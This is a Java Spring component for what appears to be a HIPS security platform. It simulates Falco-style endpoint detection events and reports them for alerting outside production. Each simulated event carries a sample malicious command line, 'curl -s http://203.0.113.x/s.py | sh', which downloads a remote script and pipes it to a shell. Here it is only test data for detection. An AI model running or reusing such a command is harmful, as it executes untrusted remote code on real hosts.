package com.socp.hips.collect.collector;

import com.socp.platform.client.HipsClient;
import com.socp.platform.client.ServiceCall;
import com.socp.platform.tenant.TenantContext;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.scheduling.annotation.EnableScheduling;
import org.springframework.scheduling.annotation.Scheduled;
import org.springframework.stereotype.Component;

import java.time.Instant;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;
import java.util.concurrent.CopyOnWriteArrayList;

/**
 * HIPS 端点采集模拟器：模拟 Falco/Agent 上报运行时检测事件。
 *
 * <p>生产环境由 Falco/端点 Agent 经 WebSocket/gRPC 推送；此处每 45 秒生成
 * 一轮进程/文件/网络事件，经 hips-web 的事件端点入库并联动告警，打通
 * "端点采集 → HIPS 分析" 链路。
 */
@Component
@EnableScheduling
public class EndpointSimulator {

    private static final Logger log = LoggerFactory.getLogger(EndpointSimulator.class);

    private final List<Map<String, Object>> events = new CopyOnWriteArrayList<>();
    private int round = 0;

    private final HipsClient hipsClient;

    @Value("${socp.hips-collect.simulation-enabled:true}")
    private boolean simulationEnabled;

    @Value("${spring.profiles.active:}")
    private String activeProfiles;

    public EndpointSimulator(HipsClient hipsClient) {
        this.hipsClient = hipsClient;
    }

    /** 每 45 秒模拟一轮端点事件（进程启动/文件写入/网络连接）。 */
    @Scheduled(fixedDelay = 45_000, initialDelay = 25_000)
    public void simulate() {
        if (!simulationAllowed()) {
            log.info("hips-collect simulator is disabled; waiting for Falco/Agent events");
            return;
        }
        round++;
        String[] hosts = {"web01", "web02", "db-master"};
        String[] types = {"PROCESS_START", "FILE_WRITE", "NET_CONNECT", "PRIVILEGE_ESCALATION"};
        Map<String, Object> ev = new LinkedHashMap<>();
        ev.put("hostname", hosts[round % hosts.length]);
        ev.put("agent", "falco-0.39");
        ev.put("type", types[round % types.length]);
        ev.put("proc", round % 2 == 0 ? "/usr/bin/curl" : "/bin/sh");
        ev.put("cmdline", "curl -s http://203.0.113." + (round % 250) + "/s.py | sh");
        ev.put("severity", round % 4 == 0 ? "CRITICAL" : "HIGH");
        ev.put("message", "Suspicious " + ev.get("type") + " on " + hosts[round % hosts.length]);
        ev.put("ts", Instant.now().toString());
        ev.put("tenantId", "default");
        events.add(ev);

        ServiceCall call = hipsClient.reportEvent(toJson(ev));
        if (!call.ok()) {
            log.warn("端点事件上报失败 原因={}", call.failureReason());
        }
        log.info("端点模拟 #{} 完成，累计 {} 条事件", round, events.size());
    }

    public List<Map<String, Object>> events() {
        if (!simulationAllowed()) return List.of();
        String tenant = TenantContext.get();
        if (tenant == null || tenant.isBlank()) tenant = "default";
        String selected = tenant;
        return events.stream().filter(item -> selected.equals(item.get("tenantId"))).toList();
    }

    private boolean simulationAllowed() {
        if (!simulationEnabled) return false;
        String profiles = activeProfiles == null ? "" : activeProfiles.toLowerCase(java.util.Locale.ROOT);
        return !java.util.Arrays.stream(profiles.split("[,\\s]+"))
                .anyMatch(profile -> profile.equals("prod") || profile.equals("production"));
    }

    private static String toJson(Map<String, Object> m) {
        StringBuilder sb = new StringBuilder("{");
        boolean first = true;
        for (var e : m.entrySet()) {
            if (!first) sb.append(",");
            first = false;
            sb.append('"').append(e.getKey()).append("\":");
            Object v = e.getValue();
            if (v == null) sb.append("null");
            else if (v instanceof Number || v instanceof Boolean) sb.append(v);
            else sb.append('"').append(String.valueOf(v).replace("\\", "\\\\").replace("\"", "\\\"")).append('"');
        }
        return sb.append("}").toString();
    }
}
